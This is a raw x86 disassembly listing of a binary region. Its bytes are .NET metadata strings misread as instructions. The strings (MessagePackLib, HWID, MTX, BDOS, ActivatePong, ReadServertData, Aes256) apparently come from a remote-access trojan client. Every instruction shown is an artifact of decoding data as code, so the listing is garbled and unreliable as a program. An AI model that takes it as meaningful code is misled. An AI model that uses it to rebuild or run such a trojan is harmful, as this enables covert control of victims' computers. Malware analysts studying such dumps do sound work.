  407705:	0f 1d 0f             	nopl   (%edi)
  407708:	35 0f ef 05 5b       	xor    $0x5b05ef0f,%eax
  40770d:	06                   	push   %es
  40770e:	75 06                	jne    0x407716
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	08 1c 01             	or     %bl,(%ecx,%eax,1)
  40771d:	00 00                	add    %al,(%eax)
  40771f:	01 73 00             	add    %esi,0x0(%ebx)
  407722:	f3 1b 01             	repz sbb (%ecx),%eax
  407725:	00 00                	add    %al,(%eax)
  407727:	01 75 00             	add    %esi,0x0(%ebp)
  40772a:	f0 05 02 00 41 01    	lock add $0x1410002,%eax
  407730:	77 00                	ja     0x407732
  407732:	09 1b                	or     %ebx,(%ebx)
  407734:	02 00                	add    (%eax),%al
  407736:	40                   	inc    %eax
  407737:	01 79 00             	add    %edi,0x0(%ecx)
  40773a:	c4 08                	les    (%eax),%ecx
  40773c:	02 00                	add    (%eax),%al
  40773e:	40                   	inc    %eax
  40773f:	01 7b 00             	add    %edi,0x0(%ebx)
  407742:	86 0e                	xchg   %cl,(%esi)
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	5c                   	pop    %esp
  407765:	02 00                	add    (%eax),%al
  407767:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	c2 02 00             	ret    $0x2
  407779:	00 00                	add    %al,(%eax)
  40777b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	f6 0f 00             	testb  $0x0,(%edi)
  40778d:	00 00                	add    %al,(%eax)
  40778f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 dc                	add    %bl,%ah
  40779f:	0c 00                	or     $0x0,%al
  4077a1:	00 00                	add    %al,(%eax)
  4077a3:	00 04 00             	add    %al,(%eax,%eax,1)
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	4c                   	dec    %esp
  4077b3:	08 00                	or     %al,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 e6                	add    %ah,%dh
  4077c7:	02 00                	add    (%eax),%al
  4077c9:	00 00                	add    %al,(%eax)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 87 1a 00 00 00    	add    %al,0x1a(%edi)
  4077df:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	ae                   	scas   %es:(%edi),%al
  4077ef:	17                   	pop    %ss
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 9d 12 00 00 00    	add    %bl,0x12(%ebp)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  407829:	70 5f                	jo     0x40788a
  40782b:	5f                   	pop    %edi
  40782c:	30 00                	xor    %al,(%eax)
  40782e:	49                   	dec    %ecx
  40782f:	45                   	inc    %ebp
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
  407831:	75 6d                	jne    0x4078a0
  407833:	65 72 61             	gs jb  0x407897
  407836:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40783a:	31 00                	xor    %eax,(%eax)
  40783c:	43                   	inc    %ebx
  40783d:	61                   	popa
  40783e:	6c                   	insb   (%dx),%es:(%edi)
  40783f:	6c                   	insb   (%dx),%es:(%edi)
  407840:	53                   	push   %ebx
  407841:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407848:	69 
  407849:	73 74                	jae    0x4078bf
  40784b:	60                   	pusha
  40784c:	31 00                	xor    %eax,(%eax)
  40784e:	61                   	popa
  40784f:	31 00                	xor    %eax,(%eax)
  407851:	76 31                	jbe    0x407884
  407853:	00 5f 5f             	add    %bl,0x5f(%edi)
  407856:	53                   	push   %ebx
  407857:	74 61                	je     0x4078ba
  407859:	74 69                	je     0x4078c4
  40785b:	63 41 72             	arpl   %eax,0x72(%ecx)
  40785e:	72 61                	jb     0x4078c1
  407860:	79 49                	jns    0x4078ab
  407862:	6e                   	outsb  %ds:(%esi),(%dx)
  407863:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40786a:	69 
  40786b:	7a 65                	jp     0x4078d2
  40786d:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  407872:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407879:	74 2e                	je     0x4078a9
  40787b:	57                   	push   %edi
  40787c:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  407883:	55                   	push   %ebp
  407884:	49                   	dec    %ecx
  407885:	6e                   	outsb  %ds:(%esi),(%dx)
  407886:	74 33                	je     0x4078bb
  407888:	32 00                	xor    (%eax),%al
  40788a:	54                   	push   %esp
  40788b:	6f                   	outsl  %ds:(%esi),(%dx)
  40788c:	49                   	dec    %ecx
  40788d:	6e                   	outsb  %ds:(%esi),(%dx)
  40788e:	74 33                	je     0x4078c3
  407890:	32 00                	xor    (%eax),%al
  407892:	53                   	push   %ebx
  407893:	77 61                	ja     0x4078f6
  407895:	70 49                	jo     0x4078e0
  407897:	6e                   	outsb  %ds:(%esi),(%dx)
  407898:	74 33                	je     0x4078cd
  40789a:	32 00                	xor    (%eax),%al
  40789c:	3c 3e                	cmp    $0x3e,%al
  40789e:	6f                   	outsl  %ds:(%esi),(%dx)
  40789f:	5f                   	pop    %edi
  4078a0:	5f                   	pop    %edi
  4078a1:	32 00                	xor    (%eax),%al
  4078a3:	61                   	popa
  4078a4:	32 00                	xor    (%eax),%al
  4078a6:	58                   	pop    %eax
  4078a7:	35 30 39 43 65       	xor    $0x65433930,%eax
  4078ac:	72 74                	jb     0x407922
  4078ae:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4078b5:	32 00                	xor    (%eax),%al
  4078b7:	76 32                	jbe    0x4078eb
  4078b9:	00 76 33             	add    %dh,0x33(%esi)
  4078bc:	00 57 72             	add    %dl,0x72(%edi)
  4078bf:	69 74 65 55 49 6e 74 	imul   $0x36746e49,0x55(%ebp,%eiz,2),%esi
  4078c6:	36 
  4078c7:	34 00                	xor    $0x0,%al
  4078c9:	54                   	push   %esp
  4078ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cb:	55                   	push   %ebp
  4078cc:	49                   	dec    %ecx
  4078cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ce:	74 36                	je     0x407906
  4078d0:	34 00                	xor    $0x0,%al
  4078d2:	47                   	inc    %edi
  4078d3:	65 74 41             	gs je  0x407917
  4078d6:	73 55                	jae    0x40792d
  4078d8:	49                   	dec    %ecx
  4078d9:	6e                   	outsb  %ds:(%esi),(%dx)
  4078da:	74 36                	je     0x407912
  4078dc:	34 00                	xor    $0x0,%al
  4078de:	53                   	push   %ebx
  4078df:	65 74 41             	gs je  0x407923
  4078e2:	73 55                	jae    0x407939
  4078e4:	49                   	dec    %ecx
  4078e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4078e6:	74 36                	je     0x40791e
  4078e8:	34 00                	xor    $0x0,%al
  4078ea:	54                   	push   %esp
  4078eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078ec:	49                   	dec    %ecx
  4078ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ee:	74 36                	je     0x407926
  4078f0:	34 00                	xor    $0x0,%al
  4078f2:	53                   	push   %ebx
  4078f3:	77 61                	ja     0x407956
  4078f5:	70 49                	jo     0x407940
  4078f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4078f8:	74 36                	je     0x407930
  4078fa:	34 00                	xor    $0x0,%al
  4078fc:	54                   	push   %esp
  4078fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4078fe:	55                   	push   %ebp
  4078ff:	49                   	dec    %ecx
  407900:	6e                   	outsb  %ds:(%esi),(%dx)
  407901:	74 31                	je     0x407934
  407903:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  407908:	6e                   	outsb  %ds:(%esi),(%dx)
  407909:	74 31                	je     0x40793c
  40790b:	36 00 53 77          	add    %dl,%ss:0x77(%ebx)
  40790f:	61                   	popa
  407910:	70 49                	jo     0x40795b
  407912:	6e                   	outsb  %ds:(%esi),(%dx)
  407913:	74 31                	je     0x407946
  407915:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  407919:	41                   	inc    %ecx
  40791a:	43                   	inc    %ebx
  40791b:	53                   	push   %ebx
  40791c:	48                   	dec    %eax
  40791d:	41                   	inc    %ecx
  40791e:	32 35 36 00 53 68    	xor    0x68530036,%dh
  407924:	61                   	popa
  407925:	32 35 36 00 41 65    	xor    0x65410036,%dh
  40792b:	73 32                	jae    0x40795f
  40792d:	35 36 00 61 65       	xor    $0x65610036,%eax
  407932:	73 32                	jae    0x407966
  407934:	35 36 00 5f 5f       	xor    $0x5f5f0036,%eax
  407939:	53                   	push   %ebx
  40793a:	74 61                	je     0x40799d
  40793c:	74 69                	je     0x4079a7
  40793e:	63 41 72             	arpl   %eax,0x72(%ecx)
  407941:	72 61                	jb     0x4079a4
  407943:	79 49                	jns    0x40798e
  407945:	6e                   	outsb  %ds:(%esi),(%dx)
  407946:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40794d:	69 
  40794e:	7a 65                	jp     0x4079b5
  407950:	3d 36 00 67 65       	cmp    $0x65670036,%eax
  407955:	74 5f                	je     0x4079b6
  407957:	55                   	push   %ebp
  407958:	54                   	push   %esp
  407959:	46                   	inc    %esi
  40795a:	38 00                	cmp    %al,(%eax)
  40795c:	3c 4d                	cmp    $0x4d,%al
  40795e:	6f                   	outsl  %ds:(%esi),(%dx)
  40795f:	64 75 6c             	fs jne 0x4079ce
  407962:	65 3e 00 4d 65       	gs add %cl,%ds:0x65(%ebp)
  407967:	73 73                	jae    0x4079dc
  407969:	61                   	popa
  40796a:	67 65 50             	addr16 gs push %eax
  40796d:	61                   	popa
  40796e:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  407971:	69 62 2e 3c 50 72 69 	imul   $0x6972503c,0x2e(%edx),%esp
  407978:	76 61                	jbe    0x4079db
  40797a:	74 65                	je     0x4079e1
  40797c:	49                   	dec    %ecx
  40797d:	6d                   	insl   (%dx),%es:(%edi)
  40797e:	70 6c                	jo     0x4079ec
  407980:	65 6d                	gs insl (%dx),%es:(%edi)
  407982:	65 6e                	outsb  %gs:(%esi),(%dx)
  407984:	74 61                	je     0x4079e7
  407986:	74 69                	je     0x4079f1
  407988:	6f                   	outsl  %ds:(%esi),(%dx)
  407989:	6e                   	outsb  %ds:(%esi),(%dx)
  40798a:	44                   	inc    %esp
  40798b:	65 74 61             	gs je  0x4079ef
  40798e:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  407995:	42 
  407996:	32 41 31             	xor    0x31(%ecx),%al
  407999:	46                   	inc    %esi
  40799a:	39 39                	cmp    %edi,(%ecx)
  40799c:	30 32                	xor    %dh,(%edx)
  40799e:	42                   	inc    %edx
  40799f:	33 35 46 38 46 38    	xor    0x38463846,%esi
  4079a5:	38 30                	cmp    %dh,(%eax)
  4079a7:	45                   	inc    %ebp
  4079a8:	46                   	inc    %esi
  4079a9:	31 36                	xor    %esi,(%esi)
  4079ab:	39 32                	cmp    %esi,(%edx)
  4079ad:	43                   	inc    %ebx
  4079ae:	45                   	inc    %ebp
  4079af:	39 39                	cmp    %edi,(%ecx)
  4079b1:	34 37                	xor    $0x37,%al
  4079b3:	41                   	inc    %ecx
  4079b4:	31 39                	xor    %edi,(%ecx)
  4079b6:	33 44 35 41          	xor    0x41(%ebp,%esi,1),%eax
  4079ba:	36 39 38             	cmp    %edi,%ss:(%eax)
  4079bd:	44                   	inc    %esp
  4079be:	38 46 35             	cmp    %al,0x35(%esi)
  4079c1:	36 38 42 44          	cmp    %al,%ss:0x44(%edx)
  4079c5:	41                   	inc    %ecx
  4079c6:	37                   	aaa
  4079c7:	32 31                	xor    (%ecx),%dh
  4079c9:	36 35 38 45 44 34    	ss xor $0x34444538,%eax
  4079cf:	43                   	inc    %ebx
  4079d0:	35 38 42 00 47       	xor    $0x47004238,%eax
  4079d5:	43                   	inc    %ebx
  4079d6:	00 45 53             	add    %al,0x53(%ebp)
  4079d9:	5f                   	pop    %edi
  4079da:	53                   	push   %ebx
  4079db:	59                   	pop    %ecx
  4079dc:	53                   	push   %ebx
  4079dd:	54                   	push   %esp
  4079de:	45                   	inc    %ebp
  4079df:	4d                   	dec    %ebp
  4079e0:	5f                   	pop    %edi
  4079e1:	52                   	push   %edx
  4079e2:	45                   	inc    %ebp
  4079e3:	51                   	push   %ecx
  4079e4:	55                   	push   %ebp
  4079e5:	49                   	dec    %ecx
  4079e6:	52                   	push   %edx
  4079e7:	45                   	inc    %ebp
  4079e8:	44                   	inc    %esp
  4079e9:	00 45 53             	add    %al,0x53(%ebp)
  4079ec:	5f                   	pop    %edi
  4079ed:	44                   	inc    %esp
  4079ee:	49                   	dec    %ecx
  4079ef:	53                   	push   %ebx
  4079f0:	50                   	push   %eax
  4079f1:	4c                   	dec    %esp
  4079f2:	41                   	inc    %ecx
  4079f3:	59                   	pop    %ecx
  4079f4:	5f                   	pop    %edi
  4079f5:	52                   	push   %edx
  4079f6:	45                   	inc    %ebp
  4079f7:	51                   	push   %ecx
  4079f8:	55                   	push   %ebp
  4079f9:	49                   	dec    %ecx
  4079fa:	52                   	push   %edx
  4079fb:	45                   	inc    %ebp
  4079fc:	44                   	inc    %esp
  4079fd:	00 4d 61             	add    %cl,0x61(%ebp)
  407a00:	70 4e                	jo     0x407a50
  407a02:	61                   	popa
  407a03:	6d                   	insl   (%dx),%es:(%edi)
  407a04:	65 54                	gs push %esp
  407a06:	6f                   	outsl  %ds:(%esi),(%dx)
  407a07:	4f                   	dec    %edi
  407a08:	49                   	dec    %ecx
  407a09:	44                   	inc    %esp
  407a0a:	00 48 57             	add    %cl,0x57(%eax)
  407a0d:	49                   	dec    %ecx
  407a0e:	44                   	inc    %esp
  407a0f:	00 67 65             	add    %ah,0x65(%edi)
  407a12:	74 5f                	je     0x407a73
  407a14:	46                   	inc    %esi
  407a15:	6f                   	outsl  %ds:(%esi),(%dx)
  407a16:	72 6d                	jb     0x407a85
  407a18:	61                   	popa
  407a19:	74 49                	je     0x407a64
  407a1b:	44                   	inc    %esp
  407a1c:	00 45 58             	add    %al,0x58(%ebp)
  407a1f:	45                   	inc    %ebp
  407a20:	43                   	inc    %ebx
  407a21:	55                   	push   %ebp
  407a22:	54                   	push   %esp
  407a23:	49                   	dec    %ecx
  407a24:	4f                   	dec    %edi
  407a25:	4e                   	dec    %esi
  407a26:	5f                   	pop    %edi
  407a27:	53                   	push   %ebx
  407a28:	54                   	push   %esp
  407a29:	41                   	inc    %ecx
  407a2a:	54                   	push   %esp
  407a2b:	45                   	inc    %ebp
  407a2c:	00 38                	add    %bh,(%eax)
  407a2e:	37                   	aaa
  407a2f:	36 33 39             	xor    %ss:(%ecx),%edi
  407a32:	31 32                	xor    %esi,(%edx)
  407a34:	36 45                	ss inc %ebp
  407a36:	41                   	inc    %ecx
  407a37:	37                   	aaa
  407a38:	37                   	aaa
  407a39:	42                   	inc    %edx
  407a3a:	33 35 38 46 32 36    	xor    0x36324638,%esi
  407a40:	35 33 32 33 36       	xor    $0x36333233,%eax
  407a45:	37                   	aaa
  407a46:	44                   	inc    %esp
  407a47:	42                   	inc    %edx
  407a48:	41                   	inc    %ecx
  407a49:	36 37                	ss aaa
  407a4b:	43                   	inc    %ebx
  407a4c:	35 33 31 30 45       	xor    $0x45303133,%eax
  407a51:	46                   	inc    %esi
  407a52:	35 30 41 38 44       	xor    $0x44384130,%eax
  407a57:	39 38                	cmp    %edi,(%eax)
  407a59:	38 38                	cmp    %bh,(%eax)
  407a5b:	45                   	inc    %ebp
  407a5c:	44                   	inc    %esp
  407a5d:	30 37                	xor    %dh,(%edi)
  407a5f:	30 43 44             	xor    %al,0x44(%ebx)
  407a62:	34 30                	xor    $0x30,%al
  407a64:	45                   	inc    %ebp
  407a65:	31 46 36             	xor    %eax,0x36(%esi)
  407a68:	30 35 41 38 46 00    	xor    %dh,0x463841
  407a6e:	67 65 74 5f          	addr16 gs je 0x407ad1
  407a72:	41                   	inc    %ecx
  407a73:	53                   	push   %ebx
  407a74:	43                   	inc    %ebx
  407a75:	49                   	dec    %ecx
  407a76:	49                   	dec    %ecx
  407a77:	00 41 44             	add    %al,0x44(%ecx)
  407a7a:	52                   	push   %edx
  407a7b:	4f                   	dec    %edi
  407a7c:	49                   	dec    %ecx
  407a7d:	44                   	inc    %esp
  407a7e:	4e                   	dec    %esi
  407a7f:	48                   	dec    %eax
  407a80:	4f                   	dec    %edi
  407a81:	00 53 79             	add    %dl,0x79(%ebx)
  407a84:	73 74                	jae    0x407afa
  407a86:	65 6d                	gs insl (%dx),%es:(%edi)
  407a88:	2e 49                	cs dec %ecx
  407a8a:	4f                   	dec    %edi
  407a8b:	00 49 73             	add    %cl,0x73(%ecx)
  407a8e:	58                   	pop    %eax
  407a8f:	50                   	push   %eax
  407a90:	00 42 44             	add    %al,0x44(%edx)
  407a93:	4f                   	dec    %edi
  407a94:	53                   	push   %ebx
  407a95:	00 45 53             	add    %al,0x53(%ebp)
  407a98:	5f                   	pop    %edi
  407a99:	43                   	inc    %ebx
  407a9a:	4f                   	dec    %edi
  407a9b:	4e                   	dec    %esi
  407a9c:	54                   	push   %esp
  407a9d:	49                   	dec    %ecx
  407a9e:	4e                   	dec    %esi
  407a9f:	55                   	push   %ebp
  407aa0:	4f                   	dec    %edi
  407aa1:	55                   	push   %ebp
  407aa2:	53                   	push   %ebx
  407aa3:	00 67 65             	add    %ah,0x65(%edi)
  407aa6:	74 5f                	je     0x407b07
  407aa8:	49                   	dec    %ecx
  407aa9:	56                   	push   %esi
  407aaa:	00 73 65             	add    %dh,0x65(%ebx)
  407aad:	74 5f                	je     0x407b0e
  407aaf:	49                   	dec    %ecx
  407ab0:	56                   	push   %esi
  407ab1:	00 47 65             	add    %al,0x65(%edi)
  407ab4:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab5:	65 72 61             	gs jb  0x407b19
  407ab8:	74 65                	je     0x407b1f
  407aba:	49                   	dec    %ecx
  407abb:	56                   	push   %esi
  407abc:	00 4d 54             	add    %cl,0x54(%ebp)
  407abf:	58                   	pop    %eax
  407ac0:	00 76 61             	add    %dh,0x61(%esi)
  407ac3:	6c                   	insb   (%dx),%es:(%edi)
  407ac4:	75 65                	jne    0x407b2b
  407ac6:	5f                   	pop    %edi
  407ac7:	5f                   	pop    %edi
  407ac8:	00 52 65             	add    %dl,0x65(%edx)
  407acb:	61                   	popa
  407acc:	64 53                	fs push %ebx
  407ace:	65 72 76             	gs jb  0x407b47
  407ad1:	65 72 74             	gs jb  0x407b48
  407ad4:	44                   	inc    %esp
  407ad5:	61                   	popa
  407ad6:	74 61                	je     0x407b39
  407ad8:	00 64 61 74          	add    %ah,0x74(%ecx,%eiz,2)
  407adc:	61                   	popa
  407add:	00 6d 73             	add    %ch,0x73(%ebp)
  407ae0:	63 6f 72             	arpl   %ebp,0x72(%edi)
  407ae3:	6c                   	insb   (%dx),%es:(%edi)
  407ae4:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  407aeb:	65 6d                	gs insl (%dx),%es:(%edi)
  407aed:	2e 43                	cs inc %ebx
  407aef:	6f                   	outsl  %ds:(%esi),(%dx)
  407af0:	6c                   	insb   (%dx),%es:(%edi)
  407af1:	6c                   	insb   (%dx),%es:(%edi)
  407af2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407af7:	6e                   	outsb  %ds:(%esi),(%dx)
  407af8:	73 2e                	jae    0x407b28
  407afa:	47                   	inc    %edi
  407afb:	65 6e                	outsb  %gs:(%esi),(%dx)
  407afd:	65 72 69             	gs jb  0x407b69
  407b00:	63 00                	arpl   %eax,(%eax)
  407b02:	4d                   	dec    %ebp
  407b03:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407b0a:	74 2e                	je     0x407b3a
  407b0c:	56                   	push   %esi
  407b0d:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  407b14:	73 69                	jae    0x407b7f
  407b16:	63 00                	arpl   %eax,(%eax)
  407b18:	67 65 74 5f          	addr16 gs je 0x407b7b
  407b1c:	53                   	push   %ebx
  407b1d:	65 6e                	outsb  %gs:(%esi),(%dx)
  407b1f:	64 53                	fs push %ebx
  407b21:	79 6e                	jns    0x407b91
  407b23:	63 00                	arpl   %eax,(%eax)
  407b25:	45                   	inc    %ebp
  407b26:	6e                   	outsb  %ds:(%esi),(%dx)
  407b27:	64 52                	fs push %edx
  407b29:	65 61                	gs popa
  407b2b:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  407b2f:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  407b36:	00 
  407b37:	54                   	push   %esp
  407b38:	68 72 65 61 64       	push   $0x64616572
  407b3d:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  407b41:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  407b45:	6e                   	outsb  %ds:(%esi),(%dx)
  407b46:	65 72 41             	gs jb  0x407b8a
  407b49:	64 64 00 53 48       	fs add %dl,%fs:0x48(%ebx)
  407b4e:	41                   	inc    %ecx
  407b4f:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  407b55:	61                   	popa
  407b56:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  407b5c:	74 5f                	je     0x407bbd
  407b5e:	43                   	inc    %ebx
  407b5f:	6f                   	outsl  %ds:(%esi),(%dx)
  407b60:	6e                   	outsb  %ds:(%esi),(%dx)
  407b61:	6e                   	outsb  %ds:(%esi),(%dx)
  407b62:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b67:	00 67 65             	add    %ah,0x65(%edi)
  407b6a:	74 5f                	je     0x407bcb
  407b6c:	49                   	dec    %ecx
  407b6d:	73 43                	jae    0x407bb2
  407b6f:	6f                   	outsl  %ds:(%esi),(%dx)
  407b70:	6e                   	outsb  %ds:(%esi),(%dx)
  407b71:	6e                   	outsb  %ds:(%esi),(%dx)
  407b72:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b77:	00 73 65             	add    %dh,0x65(%ebx)
  407b7a:	74 5f                	je     0x407bdb
  407b7c:	49                   	dec    %ecx
  407b7d:	73 43                	jae    0x407bc2
  407b7f:	6f                   	outsl  %ds:(%esi),(%dx)
  407b80:	6e                   	outsb  %ds:(%esi),(%dx)
  407b81:	6e                   	outsb  %ds:(%esi),(%dx)
  407b82:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407b87:	00 52 65             	add    %dl,0x65(%edx)
  407b8a:	63 65 69             	arpl   %esp,0x69(%ebp)
  407b8d:	76 65                	jbe    0x407bf4
  407b8f:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  407b93:	74 5f                	je     0x407bf4
  407b95:	47                   	inc    %edi
  407b96:	75 69                	jne    0x407c01
  407b98:	64 00 48 77          	add    %cl,%fs:0x77(%eax)
  407b9c:	69 64 00 3c 53 65 6e 	imul   $0x646e6553,0x3c(%eax,%eax,1),%esp
  407ba3:	64 
  407ba4:	53                   	push   %ebx
  407ba5:	79 6e                	jns    0x407c15
  407ba7:	63 3e                	arpl   %edi,(%esi)
  407ba9:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407bad:	61                   	popa
  407bae:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bb1:	6e                   	outsb  %ds:(%esi),(%dx)
  407bb2:	67 46                	addr16 inc %esi
  407bb4:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407bbb:	73 43                	jae    0x407c00
  407bbd:	6f                   	outsl  %ds:(%esi),(%dx)
  407bbe:	6e                   	outsb  %ds:(%esi),(%dx)
  407bbf:	6e                   	outsb  %ds:(%esi),(%dx)
  407bc0:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  407bc5:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407bca:	61                   	popa
  407bcb:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407bce:	6e                   	outsb  %ds:(%esi),(%dx)
  407bcf:	67 46                	addr16 inc %esi
  407bd1:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  407bd8:	65 65 70 41          	gs gs jo 0x407c1d
  407bdc:	6c                   	insb   (%dx),%es:(%edi)
  407bdd:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  407be4:	42                   	inc    %edx
  407be5:	61                   	popa
  407be6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407be9:	6e                   	outsb  %ds:(%esi),(%dx)
  407bea:	67 46                	addr16 inc %esi
  407bec:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  407bf3:	65 61                	gs popa
  407bf5:	64 65 72 53          	fs gs jb 0x407c4c
  407bf9:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  407c00:	42                   	inc    %edx
  407c01:	61                   	popa
  407c02:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c05:	6e                   	outsb  %ds:(%esi),(%dx)
  407c06:	67 46                	addr16 inc %esi
  407c08:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  407c0f:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  407c16:	42                   	inc    %edx
  407c17:	61                   	popa
  407c18:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c1b:	6e                   	outsb  %ds:(%esi),(%dx)
  407c1c:	67 46                	addr16 inc %esi
  407c1e:	69 65 6c 64 00 3c 41 	imul   $0x413c0064,0x6c(%ebp),%esp
  407c25:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407c29:	61                   	popa
  407c2a:	74 65                	je     0x407c91
  407c2c:	50                   	push   %eax
  407c2d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  407c2f:	67 3e 6b 5f 5f 42    	imul   $0x42,%ds:0x5f(%bx),%ebx
  407c35:	61                   	popa
  407c36:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c39:	6e                   	outsb  %ds:(%esi),(%dx)
  407c3a:	67 46                	addr16 inc %esi
  407c3c:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  407c43:	6e                   	outsb  %ds:(%esi),(%dx)
  407c44:	74 65                	je     0x407cab
  407c46:	72 76                	jb     0x407cbe
  407c48:	61                   	popa
  407c49:	6c                   	insb   (%dx),%es:(%edi)
  407c4a:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  407c4f:	61                   	popa
  407c50:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c53:	6e                   	outsb  %ds:(%esi),(%dx)
  407c54:	67 46                	addr16 inc %esi
  407c56:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  407c5d:	75 66                	jne    0x407cc5
